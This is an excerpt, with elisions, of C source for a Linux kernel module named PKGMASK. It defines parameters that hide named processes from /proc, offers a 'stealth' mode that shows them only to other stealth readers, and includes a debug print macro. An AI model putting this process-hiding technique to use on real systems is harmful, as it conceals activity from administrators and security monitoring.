...
MODULE_PARM_DESC(hide_proc_names, "Comma-separated process names to hide in /proc; '!' prefix = stealth (any reader). NOTE: '!' is config syntax, NOT part of comm.");

/* === debug 开关（默认关闭，出问题时 echo 1 打开） === */
static bool pkgmask_debug;
module_param(pkgmask_debug, bool, 0644);
MODULE_PARM_DESC(pkgmask_debug, "Enable PKGMASK debug prints (default: off)");

#define PM_DBG(fmt, ...) \
	do { \
		if (unlikely(pkgmask_debug)) \
			pr_err("PKGMASK_DBG: " fmt, ##__VA_ARGS__); \
	} while (0)
...
bool pkgmask_is_stealth_pid(pid_t pid)
{
	...
	rcu_read_lock();
	t = find_task_by_vpid(pid);
	if (t && is_stealth_comm(t->comm) && !reader_is_stealth())
		hit = true;
	rcu_read_unlock();
